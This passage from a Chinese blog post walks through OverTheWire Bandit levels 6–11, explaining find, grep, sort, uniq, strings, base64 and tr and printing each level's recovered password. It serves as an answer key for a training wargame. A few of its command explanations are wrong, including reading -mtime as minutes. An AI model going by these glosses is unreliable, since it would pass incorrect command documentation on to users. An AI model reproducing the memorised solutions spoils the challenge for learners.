class="line"></span><br><span class="line">　　　　参数有： ！，-and(-a)，-or(-o)。</span><br><span class="line"></span><br><span class="line">　　　　(1)find /tmp -size +10000c -and -mtime +2 　　#在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</span><br><span class="line">   　　    (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</span><br><span class="line">   　　    (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</span><br></pre></td></tr></table></figure><br>于是我们用下面的命令，发现有个报错<code>/var/lib/dpkg/info/bandit7.password</code>其他的目录都是权限不够，只有这个报错，于是cat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c</span><br><span class="line">find: ‘/run/lvm’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit5’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit1’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit14’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit2’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit19’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit0’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit24’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit12’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit25’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit23’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit21’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit20’: Permission denied</span><br><span class="line">find: ‘/run/shm’: Permission denied</span><br><span class="line">find: ‘/run/lock/lvm’: Permission denied</span><br><span class="line">find: ‘/var/spool/bandit24’: Permission denied</span><br><span class="line">find: ‘/var/spool/rsyslog’: Permission denied</span><br><span class="line">find: ‘/var/spool/cron/crontabs’: Permission denied</span><br><span class="line">find: ‘/var/log’: Permission denied</span><br><span class="line">find: ‘/var/tmp’: Permission denied</span><br><span class="line">find: ‘/var/cache/ldconfig’: Permission denied</span><br><span class="line">find: ‘/var/cache/apt/archives/partial’: Permission denied</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">find: ‘/var/lib/apt/lists/partial’: Permission denied</span><br><span class="line">find: ‘/var/lib/polkit-1’: Permission denied</span><br><span class="line">find: ‘/cgroup2/csessions’: Permission denied</span><br><span class="line">find: ‘/home/bandit28-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit30-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit31-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit5/inhere’: Permission denied</span><br><span class="line">find: ‘/home/bandit27-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit29-git’: Permission denied</span><br><span class="line">find: ‘/tmp’: Permission denied</span><br><span class="line">find: ‘/lost+found’: Permission denied</span><br><span class="line">find: ‘/root’: Permission denied</span><br><span class="line">find: ‘/etc/ssl/private’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/backup’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/archive’: Permission denied</span><br><span class="line">find: ‘/etc/polkit-1/localauthority’: Permission denied</span><br><span class="line">find: ‘/sys/fs/pstore’: Permission denied</span><br><span class="line">find: ‘/proc/tty/driver’: Permission denied</span><br><span class="line">find: ‘/proc/30038/task/30038/fd/6’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/task/30038/fdinfo/6’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/fd/5’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/fdinfo/5’: No such file or directory</span><br><span class="line">find: ‘/boot/lost+found’: Permission denied</span><br></pre></td></tr></table></figure><br>接下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password</span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit7-8"><a href="#bandit7-8" class="headerlink" title="bandit7-8"></a>bandit7-8</h2><p>The password for the next level is stored in the file data.txt next to the word millionth<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>这个网站还有一点好处就是他会告诉你每一次会用到什么命令，所以我会把每一个需要用到的命令详细的全部列出。<br>这一关友情提示大家千万不要傻乎乎直接cat data.txt  你会发现你的电脑要爆炸了<br>所以看清题目，他需要的是millionth后面的密码，直接用上一关我们学的grep就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit7@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit7@bandit:~$ cat data.txt | grep &quot;millionth&quot;</span><br><span class="line">millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit8-9"><a href="#bandit8-9" class="headerlink" title="bandit8-9"></a>bandit8-9</h2><p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">linux中sort命令</span><br><span class="line">参　　数：</span><br><span class="line">  -b   忽略每行前面开始出的空格字符。</span><br><span class="line">  -c   检查文件是否已经按照顺序排序。</span><br><span class="line">  -d   排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br><span class="line">  -f   排序时，将小写字母视为大写字母。</span><br><span class="line">  -i   排序时，除了040至176之间的ASCII字符外，忽略其他的字符。</span><br><span class="line">  -m   将几个排序好的文件进行合并。</span><br><span class="line">  -M   将前面3个字母依照月份的缩写进行排序。</span><br><span class="line">  -n   依照数值的大小排序。</span><br><span class="line">  -o&lt;输出文件&gt;   将排序后的结果存入指定的文件。</span><br><span class="line">  -r   以相反的顺序来排序。</span><br><span class="line">  -t&lt;分隔字符&gt;   指定排序时所用的栏位分隔字符。</span><br><span class="line">  +&lt;起始栏位&gt;-&lt;结束栏位&gt;   以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。</span><br><span class="line">  --help   显示帮助。</span><br><span class="line">  --version   显示版本信息</span><br><span class="line">  sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</span><br><span class="line">  sort的-u 选项它的作用很简单，就是在输出行中去除重复行。</span><br><span class="line">  sort的-o选项，想把排序结果输出到原文件中，用重定向可就不行了</span><br><span class="line">  [root@zhoucentos log]# cat date </span><br><span class="line">2017-12-02</span><br><span class="line">2017-01-09</span><br><span class="line">2017-10-23</span><br><span class="line">2017-04-24</span><br><span class="line">这个文件有三列，列与列之间用“-”隔开了，第一列表示年，第二列表示月，第三列表示日。那么我想以月来排序，也就是以第二列来排序，如何利用sort实现？幸好，sort提供了-t选项，后面可以设定间隔符。指定了间隔符之后，就可以用-k来指定列数了。</span><br><span class="line">[root@zhoucentos log]# sort -n -k 2 -t&apos;-&apos; date      // -t&lt;分隔字符&gt;   指定排序时所用的栏位分隔字符。  -k  选择以哪个区间进行排序</span><br></pre></td></tr></table></figure><br>还要用到uniq命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">uniq 命令</span><br><span class="line">报告或删除文件中重复的行。</span><br><span class="line">语法</span><br><span class="line">uniq [ -c | -d | -u ] [ -f Fields ] [ -s Characters ] [ -Fields ] [ +Characters ] [ InFile [ OutFile ] ]</span><br><span class="line">-c 在输出行前面加上每行在输入文件中出现的次数。</span><br><span class="line">-d 仅显示重复行。</span><br><span class="line">-u 仅显示不重复的行。</span><br><span class="line">-f Fields 忽略由 Fields 变量指定的字段数目。如果 Fields 变量的值超过输入行中的字段数目, uniq 命令用空字符串进行比较。这个标志和 -Fields 标志是等价的。</span><br><span class="line">-s Characters 忽略由 Characters 变量指定的字符的数目。如果 Characters 变量的值超过输入行中的字符的数目, uniq 用空字符串进行比较。如果同时指定 -f 和 -s 标志, uniq 命令忽略由 -s Characters 标志指定的字符的数目，而从由 -f Fields 标志指定的字段后开始。 这个标志和 +Characters 标志是等价的。</span><br><span class="line">-Fields 忽略由 Fields 变量指定的字段数目。这个标志和 -f Fields 标志是等价的。</span><br><span class="line">+Characters 忽略由 Characters 变量指定的字符的数目。如果同时指定 - Fields 和 +Characters 标志, uniq 命令忽略由 +Characters 标志指定的字符数目，并从由 -Fields 标志指定的字段后开始。 这个标志和 -s Characters 标志是等价的。</span><br><span class="line">- c 显示输出中，在每行行首加上本行在文件中出现的次数。它可取代- u和- d选项。</span><br><span class="line">- d 只显示重复行 。</span><br><span class="line">- u 只显示文件中不重复的各行 。</span><br><span class="line">- n 前n个字段与每个字段前的空白一起被忽略。一个字段是一个非空格、非制表符的字符串，彼此由制表符和空格隔开（字段从0开始编号）。</span><br><span class="line">+ n 前n个字符被忽略，之前的字符被跳过（字符从0开始编号）。</span><br><span class="line">- f n 与- n相同，这里n是字段数。</span><br><span class="line">- s n 与＋n相同，这里n是字符数。</span><br></pre></td></tr></table></figure><br>首先sort data.txt<br>看到很多重复的<br><img src="/2018/10/28/bandit/8-9.jpg" alt=" "><br>于是用到uniq命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">bandit8@bandit:~$ sort data.txt | uniq -c</span><br><span class="line">     10 07iR6PwHwihvQ3av1fqoRjICCulpoyms</span><br><span class="line">     10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1</span><br><span class="line">     10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa</span><br><span class="line">     10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW</span><br><span class="line">     10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44</span><br><span class="line">     10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua</span><br><span class="line">     10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca</span><br><span class="line">     10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL</span><br><span class="line">     10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6</span><br><span class="line">     10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj</span><br><span class="line">     10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap</span><br><span class="line">     10 78rgduVcLZjLzZmooObdaN541MKV6IfQ</span><br><span class="line">     10 8qkrbCAUG9I28M49j9flUro5fWxenFzF</span><br><span class="line">     10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf</span><br><span class="line">     10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV</span><br><span class="line">     10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO</span><br><span class="line">     10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF</span><br><span class="line">     10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1</span><br><span class="line">     10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7</span><br><span class="line">     10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV</span><br><span class="line">     10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w</span><br><span class="line">     10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp</span><br><span class="line">     10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn</span><br><span class="line">     10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j</span><br><span class="line">     10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G</span><br><span class="line">     10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy</span><br><span class="line">     10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9</span><br><span class="line">     10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb</span><br><span class="line">     10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm</span><br><span class="line">     10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF</span><br><span class="line">     10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz</span><br><span class="line">     10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM</span><br><span class="line">     10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu</span><br><span class="line">     10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A</span><br><span class="line">     10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V</span><br><span class="line">     10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs</span><br><span class="line">     10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU</span><br><span class="line">     10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7</span><br><span class="line">     10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1</span><br><span class="line">     10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY</span><br><span class="line">     10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS</span><br><span class="line">     10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe</span><br><span class="line">     10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr</span><br><span class="line">     10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR</span><br><span class="line">     10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ</span><br><span class="line">     10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE</span><br><span class="line">     10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4</span><br><span class="line">     10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI</span><br><span class="line">     10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa</span><br><span class="line">     10 mdug9JbW836YVZh3ALULBAxODlinqonJ</span><br><span class="line">     10 MIpMch66sYTmmqepKYczlRA9aJrnkt68</span><br><span class="line">     10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q</span><br><span class="line">     10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F</span><br><span class="line">     10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET</span><br><span class="line">     10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR</span><br><span class="line">     10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ</span><br><span class="line">     10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w</span><br><span class="line">     10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1</span><br><span class="line">     10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt</span><br><span class="line">     10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g</span><br><span class="line">     10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV</span><br><span class="line">     10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn</span><br><span class="line">     10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN</span><br><span class="line">     10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9</span><br><span class="line">     10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu</span><br><span class="line">     10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL</span><br><span class="line">     10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa</span><br><span class="line">     10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT</span><br><span class="line">     10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw</span><br><span class="line">     10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X</span><br><span class="line">     10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I</span><br><span class="line">     10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp</span><br><span class="line">     10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj</span><br><span class="line">     10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF</span><br><span class="line">     10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX</span><br><span class="line">     10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT</span><br><span class="line">     10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe</span><br><span class="line">     10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT</span><br><span class="line">     10 tWwjd16fG17vGdjutfOygVTjEGxlijOS</span><br><span class="line">     10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O</span><br><span class="line">      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br><span class="line">     10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i</span><br><span class="line">     10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz</span><br><span class="line">     10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK</span><br><span class="line">     10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY</span><br><span class="line">     10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN</span><br><span class="line">     10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX</span><br><span class="line">     10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt</span><br><span class="line">     10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP</span><br><span class="line">     10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy</span><br><span class="line">     10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP</span><br><span class="line">     10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC</span><br><span class="line">     10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0</span><br><span class="line">     10 XURYdoIx95clq6s90MORDydQ187DxQhS</span><br><span class="line">     10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp</span><br><span class="line">     10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n</span><br><span class="line">     10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb</span><br><span class="line">     10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY</span><br><span class="line">     10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt</span><br><span class="line">     10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0</span><br><span class="line">     10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE</span><br></pre></td></tr></table></figure><br>看到<code>UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</code>这个字符只出现了一行，所以肯定是他啦<br>这个其实更简单的可以试试 <code>sort data.txt | uniq -u</code></p>
<p>因为当时就知道-c命令用法，后来发现-u是直接显示不重复的行，就更方便了。</p>
<h2 id="bandit9-10"><a href="#bandit9-10" class="headerlink" title="bandit9-10"></a>bandit9-10</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>先开始我们 cat data.txt发现很多东西都不可读m,是乱码所以我们用到了strings命令<br>strings - print the strings of printable characters in files.<br>意思是， 打印文件中可打印的字符。<br>因为题目说了以“==”开头的就是你需要的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bandit9@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit9@bandit:~$ strings data.txt </span><br><span class="line">这里其实已经可以找到flag了，但是为了防止上次那种坑，我们还是让他直接输出key</span><br><span class="line">bandit9@bandit:~$ strings data.txt | grep &quot;=&quot;</span><br><span class="line">2========== the</span><br><span class="line">========== password</span><br><span class="line">&gt;t=	yP</span><br><span class="line">rV~dHm=</span><br><span class="line">========== isa</span><br><span class="line">=FQ?P\U</span><br><span class="line">=	F[</span><br><span class="line">pb=x</span><br><span class="line">J;m=</span><br><span class="line">=)$=</span><br><span class="line">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="line">iv8!=</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-10-11"><a href="#bandit-10-11" class="headerlink" title="bandit 10-11"></a>bandit 10-11</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, which contains base64 encoded data<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>可以看到说文件被base64编码了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit10@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit10@bandit:~$ cat data.txt</span><br><span class="line">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</span><br><span class="line">bandit10@bandit:~$ base64 -d data.txt </span><br><span class="line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure><br>linux下base64用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用法：base64 [选项]... [文件]</span><br><span class="line">使用 Base64 编码/解码文件或标准输入输出。</span><br><span class="line">  -d, --decode          解码数据</span><br><span class="line">  -i, --ignore-garbag   解码时忽略非字母字符</span><br><span class="line">  -w, --wrap=字符数     在指定的字符数后自动换行(默认为76)，0 为禁用自动换行</span><br><span class="line">      --help            显示此帮助信息并退出</span><br><span class="line">      --version         显示版本信息并退出</span><br><span class="line">如果没有指定文件，或者文件为&quot;-&quot;，则从标准输入读取。</span><br><span class="line">数据以 RFC 3548 规定的 Base64 字母格式进行编码。 解码时，输入数据(加密流)可能包含一些非有效 Base64 字符的新行字符。可以尝试用 --ignore-garbage 选项来恢复加密流中任何非 base64 字符。</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-11-12"><a href="#bandit-11-12" class="headerlink" title="bandit 11-12"></a>bandit 11-12</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd.<br>题目意思是把每个字母包括大小写都用后13个字母替换了，也就是a–&gt;m<br>Linux里面tr命令正好可以干这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit11@bandit:~$ cat data.txt </span><br><span class="line">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</span><br><span class="line">bandit11@bandit:~$ cat data.txt | tr &apos;a-zA-Z&apos; &apos;n-za-mN-ZA-M&apos;</span><br><span class="line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure><br>Linux tr命令详解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tr [-cdst][--help][--version][第一字符集][第二字符集]  </span><br><span class="line">tr [OPTION]…SET1[SET2] </span><br><span class="line">-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</span><br><span class="line">-d, --delete：删除指令字符</span><br><span class="line">-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br><span class="line">-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="line">--help：显示程序用法信息</span><br><span class="line">--version：显示程序本身的版本信息</span><br><span class="line">字符集合的范围：</span><br><span class="line">\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</span><br><span class="line">\\ 反斜杠</span><br><span class="line">\a Ctrl-G 铃声</span><br><span class="line">\b Ctrl-H 退格符</span><br><span class="line">\f Ctrl-L 走行换页</span><br><span class="line">\n Ctrl-J 新行</span><br><span class="line">\r Ctrl-M 回车</span><br><span class="line">\t Ctrl-I tab键</span><br><span class="line">\v Ctrl-X 水平制表符</span><br><span class="line">CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</span><br><span class="line">[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 